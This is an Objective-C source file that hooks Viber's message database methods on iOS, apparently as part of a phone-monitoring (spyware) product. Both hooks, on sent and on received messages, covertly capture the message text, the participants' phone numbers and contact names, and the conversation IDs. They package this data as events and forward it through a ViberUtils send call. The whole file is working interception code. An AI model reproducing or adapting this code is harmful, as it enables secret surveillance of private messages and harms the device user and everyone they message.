//
//  Viber.h
//  MSFSP
//
//  Created by Makara Khloth on 4/30/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "MSFSP.h"
#import "ViberUtils.h"
#import "DBManager.h"
#import	"Conversation.h"
#import	"ViberMessage.h"
#import	"PhoneNumberIndex.h"

#import "FxIMEvent.h"
#import	"FxRecipient.h"
#import "TelephoneNumber.h"

HOOK(DBManager, addSentMessage$conversation$seq$location$attachment$, id, id arg1, id arg2, id arg3, id arg4, id arg5) {
	DLog(@"------------------------------------------------ addSentMessage:conversation ------------------------------------------------");
	ViberMessage *result = CALL_ORIG(DBManager, addSentMessage$conversation$seq$location$attachment$, arg1,arg2,arg3,arg4,arg5);
	
	if ([result text]) {
		NSString *imServiceID = @"viber";
		NSString *userId = @"owner";
		NSString *userDisplayName = @"Self";
		NSMutableArray *participants = [NSMutableArray array];
		NSString *message = [result text];
		NSString *convId = nil;
		NSString *convName = nil;
		
		Conversation *conv = result.conversation;
		convName = conv.name;
		
		NSEnumerator *enumerator = [conv.phoneNumIndexes objectEnumerator];
		id value;
		while ((value = [enumerator nextObject])) {
			FxRecipient *participant = [[FxRecipient alloc] init];
			[participant setRecipNumAddr:[value phoneNum]];
			[participant setRecipContactName:[value name]];
			[participants addObject:participant];
			[participant release];
		}
		// group chat there is a group id, 1-1 chat doesn't
		NSNumber *groupIDNum = [conv groupID];
		convId = [groupIDNum description];
		if(!groupIDNum) {
			FxRecipient *participant = [participants objectAtIndex:0];
			convId = [participant recipNumAddr];
		}
		DLog(@"groupIDNum = %@", [conv groupID]);
		DLog(@"mUserID %@", userId);
		DLog(@"mUserDisplayName %@", userDisplayName);
		for (FxRecipient *recipient in participants) {
			DLog(@"mRecipient %@", [NSString stringWithFormat:@"%@ %@",[recipient recipNumAddr], [recipient recipContactName]]);
		}
		DLog(@"mMessage %@", message);
		DLog(@"mConversationID %@", convId);
		DLog(@"mConversationName %@", convName);
		
		FxIMEvent *imEvent = [[FxIMEvent alloc] init];
		[imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		[imEvent setMUserID:userId];
		[imEvent setMDirection:kEventDirectionOut];
		[imEvent setMIMServiceID:imServiceID];
		[imEvent setMMessage:message];
		[imEvent setMRepresentationOfMessage:kIMMessageText];
		[imEvent setMUserDisplayName:userDisplayName];
		[imEvent setMParticipants:participants];
		
		// New fields ...
		[imEvent setMServiceID:kIMServiceViber];
		[imEvent setMConversationID:convId];
		[imEvent setMConversationName:convName];
		
		[ViberUtils sendViberEvent:imEvent];
		
		[imEvent release];
	}
	return result;
}

HOOK(DBManager, addReceivedMessage$conversationID$phoneNumber$seq$token$date$location$attachment$attachmentType$, id, id arg1, id arg2, id arg3, id arg4, id arg5, id arg6, id arg7, id arg8, id arg9) {
	DLog(@"------------------------------------------------ addReceivedMessage:conversationID ------------------------------------------------");
	DLog(@"message %@", arg1);
	DLog(@"conversationID %@", arg2);
	DLog(@"phoneNumber %@", arg3);
	DLog(@"seq %@", arg4);
	DLog(@"token %@", arg5);
	DLog(@"date %@", arg6);
	DLog(@"location %@", arg7);
	DLog(@"attachment %@", arg8);
	DLog(@"attachmentType %@", arg9);
	
	ViberMessage *result = CALL_ORIG(DBManager, addReceivedMessage$conversationID$phoneNumber$seq$token$date$location$attachment$attachmentType$, arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8,arg9);
	
	if ([result text]) {
		NSString *imServiceID = @"viber";
		NSString *userId = nil;
		NSString *userDisplayName = nil;
		NSMutableArray *participants = [NSMutableArray array];
		NSString *message = [result text];
		NSString *convId = nil;
		NSString *convName = nil;
		
		Conversation *conv = result.conversation;
		convName = conv.name;
		NSEnumerator *enumerator = [conv.phoneNumIndexes objectEnumerator];
		id value;
		
		FxRecipient *participant = [[FxRecipient alloc] init];
		[participant setRecipNumAddr:@"owner"];
		[participant setRecipContactName:@"Self"];
		[participants addObject:participant];
		[participant release];
		while ((value = [enumerator nextObject])) {
			TelephoneNumber *telephoneNumber = [[TelephoneNumber alloc] init];
			if([telephoneNumber isNumber:arg3 matchWithMonitorNumber:[value phoneNum]]) {
				userDisplayName = [value name];
				userId = [value phoneNum];
			} else {
				FxRecipient *participant = [[FxRecipient alloc] init];
				[participant setRecipNumAddr:[value phoneNum]];
				[participant setRecipContactName:[value name]];
				[participants addObject:participant];
				[participant release];
			}
			[telephoneNumber release];
		}
		// group chat there is a group id, 1-1 chat doesn't
		NSNumber *groupIDNum = [conv groupID];
		convId = [groupIDNum description];
		if(!groupIDNum) {
			convId = userId;
		}
		DLog(@"groupIDNum = %@", [conv groupID]);
		DLog(@"mUserID %@", userId);
		DLog(@"mUserDisplayName %@", userDisplayName);
		for (FxRecipient *recipient in participants) {
			DLog(@"mRecipient %@", [NSString stringWithFormat:@"%@ %@",[recipient recipNumAddr], [recipient recipContactName]]);
		}
		DLog(@"mMessage %@", message);
		DLog(@"mConversationID %@", convId);
		DLog(@"mConversationName %@", convName);
		
		FxIMEvent *imEvent = [[FxIMEvent alloc] init];
		[imEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		[imEvent setMUserID:userId];
		[imEvent setMDirection:kEventDirectionIn];
		[imEvent setMIMServiceID:imServiceID];
		[imEvent setMMessage:message];
		[imEvent setMRepresentationOfMessage:kIMMessageText];
		[imEvent setMUserDisplayName:userDisplayName];
		[imEvent setMParticipants:participants];
		
		// New fields ...
		[imEvent setMServiceID:kIMServiceViber];
		[imEvent setMConversationID:convId];
		[imEvent setMConversationName:convName];
		
		[ViberUtils sendViberEvent:imEvent];
		
		[imEvent release];
	}
	return result;
}
